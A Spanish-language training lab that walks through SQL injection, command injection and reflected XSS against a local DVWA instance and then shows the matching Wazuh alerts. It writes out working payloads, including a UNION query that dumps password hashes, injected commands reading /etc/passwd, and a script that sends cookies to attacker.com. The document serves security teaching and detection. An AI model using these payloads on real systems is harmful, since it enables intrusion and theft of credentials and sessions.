# Escenario: Hacking Web — DVWA

**Duracion estimada:** 60 minutos
**Servicios necesarios:** DVWA (:8080), Wazuh (:5601)
**Lo que aprenderas:** SQL Injection, XSS y Command Injection en aplicaciones web.

---

## Objetivo

Explotar 3 vulnerabilidades web en DVWA y ver como Wazuh las detecta.

---

## Configuracion inicial de DVWA

1. Abre http://localhost:8080
2. Inicia sesion: `admin` / `admin`
3. Ve a **DVWA Security** y selecciona nivel **Low**
4. Ve a **Setup/Reset DB** y haz clic en **Create / Reset Database**

---

## Ejercicio 1 — SQL Injection

1. Ve a **SQL Injection** en el menu lateral
2. En el campo "User ID" introduce: `1' OR '1'='1`
3. Haz clic en **Submit**

La query SQL retorna todos los usuarios de la base de datos.

**Por que funciona:** La aplicacion concatena el input directamente a la query:

```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

La condicion `'1'='1'` siempre es verdadera.

**Extraccion de hashes:**

```
1' UNION SELECT user, password FROM users#
```

---

## Ejercicio 2 — Command Injection

1. Ve a **Command Injection** en el menu lateral
2. En el campo IP introduce: `127.0.0.1; id`
3. Haz clic en **Submit**

El servidor ejecuta `ping 127.0.0.1` y luego `id`.

**Por que funciona:** La aplicacion pasa el input directamente a `shell_exec()` sin sanitizar.

Prueba otros payloads:

```
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /var/www/html
127.0.0.1 && whoami
```

---

## Ejercicio 3 — Cross-Site Scripting (XSS Reflected)

1. Ve a **XSS (Reflected)** en el menu lateral
2. En el campo "What's your name?" introduce: `<script>alert('XSS')</script>`
3. Haz clic en **Submit**

El navegador ejecuta el script y muestra el alert.

**Por que funciona:** El servidor inserta el input del usuario directamente en el HTML sin escapar.

**Payload de robo de cookies:**

```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

---

## Ver las alertas en Wazuh

Abre https://localhost:5601 y busca:

```
group: openseclab_dvwa
```

Reglas que se activan:

- **100001** — SQL Injection en `/vulnerabilities/sqli`
- **100002** — Command Injection en `/vulnerabilities/exec`
- **100003** — XSS en `/vulnerabilities/xss`

---

## Para reflexionar

- Que diferencia hay entre XSS Reflected y XSS Stored?
- Como previene un ORM (SQLAlchemy, Hibernate) la SQL injection?
- Por que no es suficiente solo escapar caracteres especiales para prevenir SQL injection?
- Que nivel de DVWA (Medium, High) aplica que tipo de mitigacion?
